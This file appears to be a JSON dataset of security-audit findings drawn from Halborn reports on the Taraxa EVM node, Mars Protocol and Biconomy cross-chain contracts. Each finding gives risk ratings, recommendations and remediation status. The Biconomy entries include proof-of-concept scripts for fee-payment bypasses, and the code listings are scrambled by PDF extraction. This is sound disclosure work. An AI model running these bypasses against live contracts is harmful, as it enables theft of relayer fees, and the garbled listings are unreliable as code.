        "body": "The exposed function did not return a correct error value when an error was triggered within the function. This could lead to unexpected behaviors in other functions that make use of the errors returned by Run(). Returning a nil value in the error variable would not propagate the error. Code Location: Listing 10: Taraxa-evm/core/vm/contracts.go (Lines 115,117-118,122) 99 func ( c ecrecover ) Run ( ctx CallFrame , evm * EVM ) ([] byte , error ) { 100 101 102 103 104 105 106 107 108 109 110 111 const ecRecoverInputLength = 128 input := ctx . Input input = common . RightPadBytes ( input , ecRecoverInputLength ) // \" input \" is ( hash , v , r , s ) , each 32 bytes // but for ecrecover we want (r , s , v) r := new ( big . Int ). SetBytes ( input [64:96]) s := new ( big . Int ). SetBytes ( input [96:128]) v := input [63] - 27 // tighter sig s values input homestead only apply to tx sigs if ! allZero ( input [32:63]) || ! crypto . ValidateSignatureValues (v  , r , s , false ) { 112 113 114 115 return nil , nil } // v needs to be at the end for libsecp256k1 pubKey , err := crypto . Ecrecover ( input [:32] , append ( input  [64:128] , v )) 116 117 118 119 120 121 // make sure the public key is a valid one if err != nil { return nil , nil } // the first byte of pubkey is bitcoin heritage 31 M V E A X A R A T 122 return common . LeftPadBytes ( keccak256 . Hash ( pubKey [1:]) [12:] ,  32) , nil 123 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: When an error value is returned within the function, it must be sent to the rest of the affected functions to handle this unexpected behavior. Remediation Plan: SOLVED: The Taraxa team solved the issue by adding an error message to the return value. 41cd2d7fdf855627f1b08209b6c804bf1bdd3f54 M V E A X A R A T 32 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Medium"
        ]
    },
    {
        "title": "MULTIPLE OUTDATED MODULES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As part of the security audit process, an automated verification of project dependencies was performed. As a result, multiple vulnerable or outdated modules were found, but the affected dependencies were not exploited by auditors. However, this could be exploited if an attacker gains enough privileges or reach certain conditions. Results: Module /aead/siphash /btcsuite/btcd /btcsuite/btclog /btcsuite/btcutil /btcsuite/go-socks /btcsuite/goleveldb /btcsuite/snappy-go /btcsuite/websocket /btcsuite/winsvc /davecgh/go-spew /emicklei/dot /fjl/gencodec /fsnotify/fsnotify /garslo/gogen /golang/protobuf /hpcloud/tail /jessevdk/go-flags /jrick/logrotate /k0kubun/go-ansi /kkdai/bstream Version v1.0.1 v0.20.1-beta v0.0.0-20170628155309 v0.0.0-20190425235716 v0.0.0-20170105172521 v0.0.0-20160330041536 v0.0.0-20151229074030 v0.0.0-20150119174127 v1.0.0 v1.1.1 v0.10.2 v0.0.0-20191126094850 v1.4.7 v0.0.0-20170306192744 v1.2.0 v1.0.0 v0.0.0-20141203071132 v1.0.0 v0.0.0-20180517002512 v0.0.0-20161212061736 Patched version v0.23.1 v1.0.2 v1.0.0 v1.0.0 v1.0.0 v0.0.0-20220412091415 v1.5.4 v0.0.0-20170307003452 v1.5.2 v1.5.0 v1.0.0 33 M V E A X A R A T Module /kr/pty /kr/text /kylelemons/godebug /mattn/go-isatty /mattn/go-runewidth /mitchellh/colorstring /niemeyer/pretty /onsi/ginkgo /onsi/gomega /otiai10/copy /otiai10/curr /otiai10/mint /pmezard/go-difflib /schollz/progressbar/v3 /stretchr/objx /stretchr/testify /tecbot/gorocksdb /x/crypto /x/net /x/sync /x/sys /x/text /x/tools /x/xerrors /check.v1 /fsnotify.v1 /tomb.v1 /yaml.v2 /yaml.v3 Version v1.1.1 v0.1.0 v0.0.0-20170224010052 v0.0.12 v0.0.9 v0.0.0-20190213212951 v0.0.0-20200227124842 v1.10.3 v1.7.1 v1.2.0 v1.0.0 v1.3.1 v1.0.0 v3.3.3 v0.1.0 v1.6.1 v0.0.0-20191217155057 v0.0.0-20200221231518 v0.0.0-20190620200207 v0.0.0-20190423024810 v0.0.0-20200223170610 v0.3.0 v0.0.0-20191126055441 v0.0.0-20190717185122 v1.0.0-20200227125254 v1.4.7 v1.0.0-20141024135613 v2.2.8 v3.0.0-20200313102051 Patched version v1.1.8 v0.2.0 v1.1.0 v0.0.14 v0.0.13 v1.16.5 v1.20.0 v1.7.0 v1.3.3 v3.9.0 v0.4.0 v1.8.0 v0.0.0-20220722155217 v0.0.0-20220728211354 v0.0.0-20220722155255 v0.0.0-20220731174439 v0.3.7 v0.1.12 v0.0.0-20220609144429 v1.0.0-20201130134442 v2.4.0 v3.0.1 Risk Level: Likelihood - 3 Impact - 3 34 M V E A X A R A T Recommendation: Patch or update exposed modules where possible, or reduce the attack surface so that it is impossible for an attacker to exploit this security flaw. Remediation Plan: SOLVED: The Taraxa team solved the issue by applying the proposed recommendation. No vulnerable packages were found on the specified date. bee07cd1316adabb406ab39edfc2cee7d524a840 M V E A X A R A T 35 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Medium"
        ]
    },
    {
        "title": "ERROR VALUE EVALUATED BUT NOT APPLIED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The affected functions contained error checking in them. However, the errors were not handled properly and allowed the functions to continue to run. Even when the error clauses were modified accordingly, execution was not stopped by return statements. When execution continues after an error, it could take advantage of unexpected behavior in linked functions that could not handle returned errors correctly. Code Location: Listing 11: Taraxa-evm/Common/hexutil/hexutil.go (Lines 67-68,71) if len ( input ) == 0 { return nil , ErrEmptyString } if ! has0xPrefix ( input ) { 59 // Decode decodes a hex string with 0 x prefix . 60 func Decode ( input string ) ([] byte , error ) { 61 62 63 64 65 66 67 68 69 70 71 72 } } b , err := hex . DecodeString ( input [2:]) if err != nil { } return b , err return nil , ErrMissingPrefix err = mapError ( err ) Listing 12: Taraxa-evm/Common/hexutil/hexutil.go (Lines 97-98,101) 92 unc DecodeUint64 ( input string ) ( uint64 , error ) { 93 94 95 raw , err := checkNumber ( input ) if err != nil { return 0, err 36 M V E A X A R A T 96 97 98 99 100 101 102 } } dec , err := strconv . ParseUint ( raw , 16 , 64) if err != nil { err = mapError ( err ) } return dec , err Risk Level: Likelihood - 2 Impact - 2 Recommendation: Evaluate the error clause and apply the return values accordingly. In case an error is discovered, the return value should be adapted, it is recommended not to return the results of the operation. Remediation Plan: SOLVED: The Taraxa team solved the issue by adding a return statement in case an error was detected. b4cedfde975bcd28d56203ecd8d59f75becb5936 M V E A X A R A T 37 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Low"
        ]
    },
    {
        "title": "NO ERR VARIABLE EVALUATION PRIOR TO AN OPERATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The err value of a function was not evaluated before an operation. If this error value is not evaluated properly, the value returned from the function could lead to multiple security issues, such as Out-of-Bounds and several unexpected states. Code Location:  Taraxa-evm/core/vm/evm.go Listing 13: Taraxa-evm/core/vm/evm.go (Lines 295,297) 291 // initialise a new contract and set the code that is to be used  by the 292 // EVM . The contract is a scoped environment for this  execution context // only . contract := NewContract ( CallFrame { caller , new_acc , nil , gas , 293 294  value }, code ) 295 296 297 ret , err = self . run (& contract , false ) // check whether the max code size has been exceeded maxCodeSizeExceeded := self . rules . IsEIP158 && len ( ret ) >  MaxCodeSize 298 // if the contract creation ran successfully and no errors  were returned 299 // calculate the gas required to store the code . If the code  could not 300 // be stored due to not enough gas set an error and let it be  handled 301 302 303 304 305 // by the error checking condition below . if err == nil && ! maxCodeSizeExceeded { createDataGas := uint64 ( len ( ret )) * CreateDataGas if contract . UseGas ( createDataGas ) { new_acc . SetCode ( ret ) 38 M V E A X A R A T 306 307 308 309 } else { err = ErrCodeStoreOutOfGas } } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Evaluate the return value before executing any operations on the return values. Remediation Plan: SOLVED: The Taraxa team solved the issue by checking the err value returned by certain operations. fd07c57c0861a5e967b8710c2ec610a1601ba374 M V E A X A R A T 39 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Low"
        ]
    },
    {
        "title": "IMPLICIT MEMORY ALIASING IN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ApplyDAOHardFork function contains a for loop in which the memory of the addr loop variable is accessed. At each iteration, the value of the next element in the range expression was assigned to the iteration variable; addr did not change, it just changes the value. Therefore, the expression &v referred to the same location in memory. Code Location:  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go  Taraxa-evm/consensus/misc/dao.go Listing 14: Taraxa-evm/consensus/misc/dao.go (Line 31) // Move every DAO account and extra - balance account funds into refund_acc := db . GetAccount (& DAORefundContract ) for _ , addr := range DAODrainList () { 27 func ApplyDAOHardFork ( db vm . State ) { 28  the refund contract 29 30 31 32 33 34 35 36 } acc := db . GetAccount (& addr ) bal := acc . GetBalance () refund_acc . AddBalance ( bal ) acc . SubBalance ( bal ) } Risk Level: Likelihood - 1 Impact - 1 M V E A X A R A T 40 Recommendation: Index the ranged map. This takes the address of the actual element at the i-th position, rather than the iteration variable. Listing 15: Recommended example 1 drainlist = DAODrainList () 2 for i := range drainlist { 3 4 5 6 7 acc := db . GetAccount (& drainlist [ i ]) bal := acc . GetBalance () refund_acc . AddBalance ( bal ) acc . SubBalance ( bal ) } Remediation Plan: PARTIALLY SOLVED: The Taraxa team partially solved the issue by removing the Taraxa-evm/consensus/misc/dao.go file, but there were still instances of this issue in Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract .go. M V E A X A R A T 41 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF DEFAULT CLAUSE ON SWITCH STATEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The lack of the Default clause in a Switch statement cannot be considered as a security flaw itself. However, using non-standard practices in the code could lead to unhandled errors, making the code unsafe. See the Lack of Return Error issue. Code Location:  Taraxa-evm/accounts/abi/abi.go Listing 16: Taraxa-evm/accounts/abi/abi.go (Lines 110,111,116,123) } var fields [] struct { [] Argument [] Argument string Type string Name bool Constant Anonymous bool Inputs Outputs 92 // UnmarshalJSON implements json . Unmarshaler interface 93 func ( abi * ABI ) UnmarshalJSON ( data [] byte ) error { 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 abi . Methods = make ( map [ string ] Method ) abi . Events = make ( map [ string ] Event ) for _ , field := range fields { abi . Constructor = Method { Inputs : field . Inputs , switch field . Type { case \" constructor \" : return err } if err := json . Unmarshal ( data , & fields ); err != nil { 42 M V E A X A R A T 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 } // empty defaults to function according to the abi spec case \" function \" , \" \": abi . Methods [ field . Name ] = Method { Name : Const : Inputs : Outputs : field . Outputs , field . Name , field . Constant , field . Inputs , } case \" event \" : abi . Events [ field . Name ] = Event { field . Name , Name : Anonymous : field . Anonymous , Inputs : field . Inputs , } } } return nil   Taraxa-evm/accounts/abi/argument.go:unpack  Taraxa-evm/accounts/abi/reflect.go:reflectIntKindAndType  Taraxa-evm/common/hexutil/hexutil.go:mapError  Taraxa-evm/vm/evm.go:run  Taraxa-evm/vm/opcodes.go:IsPush  Taraxa-evm/rlp/decode.go:wrapStreamError  Taraxa-evm/rlp/decode.go:decodeByteArray  Taraxa-evm/rlp/raw.go:readSize  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go: RequiredGas  Taraxa-evm/taraxa/state/dpos/precompiled/dpos_contract.go:Run  Taraxa-evm/taraxa/trie/writer.go:commit  Taraxa-evm/taraxa/trie/writer.go:mpt_insert  Taraxa-evm/taraxa/trie/writer.go:mpt_del  Taraxa-evm/taraxa/util/util.go:IsReallyNil  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_compact_64 M V E A X A R A T 43 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Include the default clause to cover the Switch statement with all options, catching unexpected behaviors that could be triggered in the function. Remediation plan: The in SOLVED: issue ae19c9931b1dc7f8e8eb1e1a8ab313bb6b853caa Taraxa team commits solved by e634895136bccf651e7dbf1cf965c88f14238752 affected several files this and 44 M V E A X A R A T 5.10 (HAL-13) INSECURE RANDOM NUMBER GENERATOR - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Informational"
        ]
    },
    {
        "title": "MULTIPLE CONSEQUENCES WHEN INTERACTING WITH UPPER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users deposit, withdraw, borrow or repay in contracts/mars-red- bank/src/contract.rs using on_behalf_of / recipient_address address in upper case (e.g.: TERRA1KG. . . XNL8), the following consequences occur:  Deposited tokens cannot be used to borrow.  Recipient cannot use his withdrawn tokens.  Recipient cannot use his borrowed tokens.  Repaying will throw error messages. These issues happen because the values are stored in contracts storage with the upper case address as a key, which creates conflicts when values are loaded using info.sender as a key, which is always in lower case (e.g.: terra1kg. . . xnl8). Code Location: Listing 1: Resources affected 1 2 3 4 mars - red - bank : execute_deposit ( on_behalf_of ) mars - red - bank : execute_withdraw ( recipient_address ) mars - red - bank : execute_borrow ( recipient_address ) mars - red - bank : execute_repay ( on_behalf_of ) Risk Level: Likelihood - 4 Impact - 4 11 Recommendation: Update the logic of functions mentioned above to turn recipient addresses into lower case. Remediation plan: PENDING: The Mars team stated that in the short term they would analyze how to address this issue comprehensively on the protocol. 12 ",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "EQUIVALENCE BETWEEN MARS AND XMARS TOKENS CAN BE BROKEN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_create_allocation function in contracts/mars-vesting/src/contra- ct.rs relies on the equivalence between Mars and xMars tokens remains true, i.e.: 1 Mars = 1 xMars. However, this equivalence can be broken if a malicious user transfers Mars tokens to mars-staking contract. As a consequence, execute_create_allocation function cannot be called, i.e.: a Denial-of-Service (DoS) that could even be permanent. It is worth noting that the likelihood for this to happen is low because allocations are created at one of the phases of protocol launch where Mars tokens have not been distributed to anyone but the multisig wallet. Code Location: Listing 2: contracts/mars-staking/src/contract.rs (Lines 544-548) 535 fn get_staking_tokens_info ( deps : Deps , 536 env : & Env , 537 config : & Config , 538 global_state : & GlobalState , 539 540 mars_to_deduct : Uint128 , 541 ) -> StdResult < StakingTokensInfo > { 542 let ( mars_token_address , xmars_token_address ) = 543 544 545 546 547 548 549 get_token_addresses ( deps , config ) ?; let total_mars_in_staking_contract = cw20_get_balance ( & deps . querier , mars_token_address . clone () , env . contract . address . clone () , )? . checked_sub ( mars_to_deduct ) ?; 13 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Fix the logic of get_staking_tokens_info function to update and store the amount of Mars tokens owned by mars-staking contract in its storage when staking / unstaking, instead of relying on Mars token balance. Remediation plan: RISK ACCEPTED: The Mars team accepted the risk for this finding. They also stated that the check in mars-vesting contract is a guarantee that they wont create more allocations for the contract and that the voting power given to this Mars token is fair. 14 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Mars_Protocol_Core_Contracts_Updated_Code_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "FEE PAYMENT BYPASS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The CCMP protocol uses an internal struct sent inside the messages to determine the fee amount, the token used to pay it, and the relayer who will receive the fee. As this struct is filled by the user and sent in his message, it is possible to modify the relayer address by the users to pay fees to themselves. Code Location: Listing 1: CrossChainMessage.sol 14 struct GasFeePaymentArgs { 15 16 17 18 } address feeTokenAddress ; uint256 feeAmount ; address relayer ; Listing 2: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 104 value : msg . value }( \" \"); 15 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 } if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  modify the gasFeePaymentArgs.relayer variable with the user address.  Execute modified ICCMPGateway.sendMessage() function with the gasFeePaymentArgs. Listing 3: feeBypass.js 1 gasFeePaymentArgs . relayer = relayer . address ; 2 3 // initial balances 4 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 5 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 6 7 // paying fees correctly 8 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 9 10 11 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 12 { value : gasFeePaymentArgs . feeAmount }) ; 16 13 // change relayer to owner 14 gasFeePaymentArgs . relayer = owner . address ; 15 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 16 17 18 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) { value : gasFeePaymentArgs . feeAmount }) Listing 4: Console Output 1 FEE -> 100.0 2 Owner ETH -> 9999.98221086197086311 3 Owner ETH -> 9899.982088081765816406 4 Owner ETH -> 9899.98198524440481391 Risk Level: Likelihood - 5 Impact - 4 Recommendation: Validating the relayer address before fee transfer is recommended. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding and implemented an off-chain service to correctly validate the payment to a whitelisted relayer address before sending the message. 17 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: High"
        ]
    },
    {
        "title": "USING ARBITRARY TOKENS ALLOW FEE PAYMENT BYPASS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The CCMP protocol uses an internal struct sent inside the messages to determine the fee amount, the token used to pay it, and the relayer who will receive the fee. As this struct is filled by the user and sent in his message, it is possible to modify the feeTokenAddress address and use an arbitrary token with a custom implementation of the transferFrom() function to avoid paying fees. Code Location: Listing 5: CrossChainMessage.sol 14 struct GasFeePaymentArgs { 15 16 17 18 } address feeTokenAddress ; uint256 feeAmount ; address relayer ; Listing 6: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 value : msg . value 18 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 } }( \" \"); if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  Deploy an arbitrary ERC20 token.  modify the gasFeePaymentArgs.feeTokenAddress variable with the token address.  Execute ICCMPGateway.sendMessage() function with the modified gasFeePaymentArgs. Listing 7: feeBypass.js 1 // deploying , minting and approving evil token 2 let evilToken = await ( await ( await ethers . getContractFactory ( \"  EvilToken \")). deploy () ). deployed () ; 3 await evilToken . mint ( parseUnits ( \" 1000000 \" , 18) ); 4 await evilToken . approve ( CCMPGateway . address , gasFeePaymentArgs .  feeAmount . mul (2) ); 5 6 // initial balances 7 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 8 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 9 console . log ( \" Owner evil token -> \" + ethers . utils . formatEther ( 19  await evilToken . balanceOf ( owner . address )) ) 10 11 // sending message with standard token 12 gasFeePaymentArgs . feeTokenAddress = Token . address ; 13 14 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 15 16 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 17 18 // sending message with evil token 19 gasFeePaymentArgs . feeTokenAddress = evilToken . address ; 20 21 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 22 23 console . log ( \" Owner evil token -> \" + ethers . utils . formatEther (  await evilToken . balanceOf ( owner . address )) ) Listing 8: Console Output 1 FEE -> 100.0 2 Owner token -> 1000000.0 3 Owner evil token -> 1000000.0 4 Owner token -> 999900.0 5 Owner evil token -> 1000000.0 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Accepting native or well-known ERC20 tokens as fee payment tokens is recommended. 20 Remediation Plan: RISK ACCEPTED: The Biconomy team will accept any token. Still, they have implemented an off-chain service to validate that the fee payment has been correctly received before sending the message. 21 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: High"
        ]
    },
    {
        "title": "UN HANDLED SITUATION ALLOWS TWICE FEE PAYMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When the CCMP protocol sends a message, an auxiliary function handles the fee payment. This function determines whether the payment is made via native ETH or ERC20 token. Suppose a user tries to send a message with native ETH, but the address added in the gasFeePaymentArgs struct is a valid ERC20 token address. In that case, the protocol will take the ETH sent as value and the token amount marked on gasFeePaymentArgs.feeAmount. Code Location: Listing 9: CCMPSendMessageFacet.sol (Line 94) uint256 feeAmount = _message . gasFeePaymentArgs . feeAmount ; address relayer = _message . gasFeePaymentArgs . relayer ; address tokenAddress = _message . gasFeePaymentArgs . 92 function _handleFee ( CCMPMessage memory _message ) internal { 93 94 95  feeTokenAddress ; 96 97 98  NATIVE_ADDRESS ) { 99 100 101 102 if ( _message . gasFeePaymentArgs . feeTokenAddress == } ( bool success , bytes memory returndata ) = relayer . call revert NativeAmountMismatch () ; if ( msg . value != feeAmount ) { if ( feeAmount >= 0) {  { 103 104 105 106 107 108 109 110 111 112 value : msg . value }( \" \"); if (! success ) { revert NativeTransferFailed ( relayer , returndata ); } } else { IERC20 ( _message . gasFeePaymentArgs . feeTokenAddress ) . safeTransferFrom ( _message . sender , relayer , 22 113 114 115 116 117 118 119 } _message . gasFeePaymentArgs . feeAmount ); } } emit FeePaid ( tokenAddress , feeAmount , relayer ); Proof of Concept:  Deploy a ICCMPGateway using the owner address.  modify the gasFeePaymentArgs.feeTokenAddress variable with a token address.  Execute ICCMPGateway.sendMessage() function with the modified gasFeePaymentArgs. Listing 10: feeBypass.js 1 // initial balances 2 console . log ( \" FEE -> \" + ethers . utils . formatEther ( gasFeePaymentArgs  . feeAmount )) 3 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 4 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 5 6 // sending message with ERC20token 7 gasFeePaymentArgs . feeTokenAddress = Token . address ; 8 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs ); 9 10 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 11 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) 12 13 // sending message with ERC20 token and ETH 14 await CCMPGateway . sendMessage (1 , \" wormhole \" , payloads ,  gasFeePaymentArgs , routeArgs , 15 { value : gasFeePaymentArgs . feeAmount }) ; 16 23 17 console . log ( \" Owner ETH -> \" + ethers . utils . formatEther ( await owner  . getBalance () ). toString () ) 18 console . log ( \" Owner token -> \" + ethers . utils . formatEther ( await  Token . balanceOf ( owner . address )) ) Listing 11: Console Output 1 FEE -> 100.0 2 Owner ETH -> 9999.984234153287750867 3 Owner token -> 1000000.0 4 Owner ETH -> 9999.984087518824239997 5 Owner token -> 999900.0 6 Owner ETH -> 9899.983963765455794609 7 Owner token -> 999800.0 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to check the msg.value is 0 when ERC20 tokens are used as payment. Remediation Plan: SOLVED: The Biconomy team now checks that the native balance is 0 in case the user is paying with another token. 24 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "CONTRACT OWNER AND PAUSER CAN RENOUNCE HIMSELF",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Owner of the contract is usually the account that deploys the contract. The ICCMPGateway smart contract, Only Owner and Pauser can perform some privileged actions such as setCCMPGateway, setCCMPExecutor, pause etc., the transferOwnership() and setPauser() functions are used to change the Owner and Pauser. Suppose an Owner or Pauser is mistakenly changed to the contract address. In that case, administrative access will result in the contract having no Owner or Pauser, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Code Location: Listing 12: ownable.sol (Lines 62,71,80) function renounceAdmin () public virtual function renounceOwnership () public virtual onlyOwner { _transferOwnership ( address (0) ) ; } /* * 61 62 63 64 65 66 67  ( ` newOwner `) . 68 69 70  onlyOwner { 71  zero address \" ); 72 73 74 75 76  ( ` newOwner `) . /* * } * @dev Transfers ownership of the contract to a new account * Can only be called by the current owner . */ function transferOwnership ( address newOwner ) public virtual require ( newOwner != address (0) , \" Ownable : new owner is the _transferOwnership ( newOwner ); * @dev Transfers ownership of the contract to a new account 25 77 78 79  { 80 81 82 83 * Internal function without access restriction . */ function _transferOwnership ( address newOwner ) internal virtual address oldOwner = _owner ; _owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); } Listing 13: CCMPConfigurationFacet.sol (Line 77) 75 76 77 78 79 function setPauser ( address _pauser ) external { LibDiamond . _enforceIsContractOwner () ; LibDiamond . _diamondStorage () . pauser = _pauser ; emit PauserUpdated ( _pauser ); } Proof of Concept:  Deploy a ICCMPGateway using the owner address.  Execute ICCMPGateway.setPauser() function with the contract address as parameter.  Execute ICCMPGateway.transferOwnership() function with the contract address as parameter. Risk Level: Likelihood - 2 Impact - 3 Recommendations: It is recommended that the contract Owner cannot set new Pausers or Owners without checking the address before. In addition, if a multi-signature wallet is used, calling the transferOwnership() and setPauser() functions should be confirmed for two or more users. 26 Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding. 27 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is no validation of the addresses in the contractor() of the Adaptors like WormholeAdaptor, AxelarAdaptor or AbacusAdapter, and other Addresses should be validated and checked that are smart contracts. different from zero when necessary. This issue is present in all the smart contracts, in the constructors and functions that use addresses as parameters. These examples show how the factory could be set up with a wrong address and how mint could burn NFTs if _owner is address(0) Some code location examples: Listing 14: AxelarAdaptor.sol address _axelarGateway , address _ccmpGateway , address _pauser ) CCMPAdaptorBase ( _ccmpGateway , _pauser ) { axelarGateway = IAxelarGateway ( _axelarGateway ); 55 constructor ( 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 // Setup Mainnet Chain ID to Names chainIdToName [1313161554] = \" aurora \"; chainIdToName [43114] = \" Avalanche \" ; chainIdToName [56] = \" binance \" ; chainIdToName [1] = \" Ethereum \" ; chainIdToName [250] = \" Fantom \" ; chainIdToName [1284] = \" Moonbeam \" ; chainIdToName [137] = \" Polygon \"; // Setup Testnet Chain ID to Names chainIdToName [1313161555] = \" aurora \"; chainIdToName [43113] = \" Avalanche \" ; 